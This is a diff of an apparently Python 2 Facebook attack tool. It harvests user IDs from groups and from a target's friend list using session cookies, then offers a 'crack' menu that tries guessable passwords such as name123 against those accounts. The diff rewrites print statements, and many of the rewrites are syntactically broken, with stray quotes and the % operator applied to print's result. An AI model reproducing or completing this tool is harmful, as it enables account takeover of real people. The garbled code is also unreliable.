@@ -84,7 +84,7 @@ def gen(show=True):
             print ('* login fail.')
             gen(show=True)
     except Exception as e:
-        print ('* error: %s' % e')
+        print ('* error: %s') % e
         gen(show=False)
 
 
@@ -160,12 +160,12 @@ class dump_grup:
             for e, i in enumerate(self.glist):
                 if q in i.get('name').lower():
                     whitelist.append(i)
-                    print '  %s. %s' % (
+                    print ('  %s. %s') % (
                      len(whitelist),
                      i.get('name').lower().replace(q, '%s%s%s' % (G, q, N)))
 
             if len(whitelist) == 0:
-                print '* no result found with this query: %s' % q
+                print ('* no result found with this query: %s') % q
                 self.search()
             else:
                 print ''
@@ -175,10 +175,10 @@ class dump_grup:
         try:
             self.listed = whitelist[(input('* select group: ') - 1)]
             self.f()
-            print '* target: %s' % self.listed.get('name')
+            print ('* target: %s' % self.listed.get('name')')
             self.dumps('https://m.facebook.com/groups/' + self.listed.get('id'))
         except Exception as e:
-            print '* %s' % e
+            print ('* %s') % e
             self.choice(whitelist)
 
     def f(self):
@@ -189,7 +189,7 @@ class dump_grup:
 
     def dumps(self, url):
         r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
-        print '\r+ dump: %s .. press ctrl+z for stop' % len(open(self.fl).read().splitlines()),
+        print ('\r+ dump: %s .. press ctrl+z for stop' % len(open(self.fl).read().splitlines()),')
         sys.stdout.flush()
         for i in r.find_all('h3'):
             try:
@@ -222,7 +222,7 @@ class dump_grup:
                         self.dumps('https://m.facebook.com/' + i.get('href'))
                         break
                     except Exception as e:
-                        print '\r- %s, retrying...' % e
+                        print ('\r- %s, retrying...') % e
                         continue
 
         exit('\n* you are successfully dump %s id from group %s...' % (len(open(self.fl).read().splitlines()), self.listed.get('name')[0:20]))
@@ -234,7 +234,7 @@ class friendlist:
         self.nitel = None
         lang(cookie)
         self.cookie = cookie
-        print '(HELP): e.g: https://www.facebook.com/me'
+        print ('(HELP): e.g: https://www.facebook.com/me')
         self.id = raw_input('?: target profile url: ')
         if self.id == '':
             friendlist(cookie)
@@ -255,12 +255,12 @@ class friendlist:
             self.nitel = a
             b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
             self.b = b
-            print '* target: %s..' % a
-            print '* output: %s' % self.fl
-            print '* friendlist: %s' % b
+            print ('* target: %s..' % a')
+            print ('* output: %s' % self.fl')
+            print ('* friendlist: %s' % b')
         for i in r.find_all('a', href=True):
             if 'fref' in i.get('href'):
-                print '\r* dump (%s)/(%s) .. press ctrl+z for stop' % (len(open(self.fl).read().splitlines()), self.b),
+                print ('\r* dump (%s)/(%s) .. press ctrl+z for stop' % (len(open(self.fl).read().splitlines()), self.b),')
                 sys.stdout.flush()
                 if 'profile_add_friend.php' in i.get('href'):
                     continue
@@ -286,7 +286,7 @@ class friendlist:
                         __import__('time').sleep(2)
                         break
                     except Exception as e:
-                        print '\r* error: %s' % e
+                        print ('\r* error: %s') % e
                         continue
 
         exit('\n+ you are successfully dump %s %s friends, output saved to %s.' % (len(open(self.fl).read().splitlines()), self.nitel, self.fl))
@@ -417,9 +417,9 @@ class crack:
         self.cp = []
         self.ko = 0
         if show == True:
-            print '\n\t[ SELECT AselectON ]\n'
-            print '  1. Crack With Manual Password Lists.'
-            print '  2. Auto Crack (name123,name12345)\n'
+            print ('\n\t[ SELECT AselectON ]\n')
+            print ('  1. Crack With Manual Password Lists.')
+            print ('  2. Auto Crack (name123,name12345)\n')
         while True:
             f = raw_input('? menu: ')
             if f == '':
@@ -432,7 +432,7 @@ class crack:
                             self.fs = open(self.apk).read().splitlines()
                             break
                         except Exception as e:
-                            print '!: %s' % e
+                            print ('!: %s') % e
                             continue
 
                     self.fl = []
@@ -443,10 +443,10 @@ class crack:
                             continue
 
                 except Exception as e:
-                    print '!: %s' % e
+                    print ('!: %s') % e
                     continue
 
-                print '+ example pass123,pass12345'
+                print ('+ example pass123,pass12345')
                 self.pwlist()
                 s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                 break
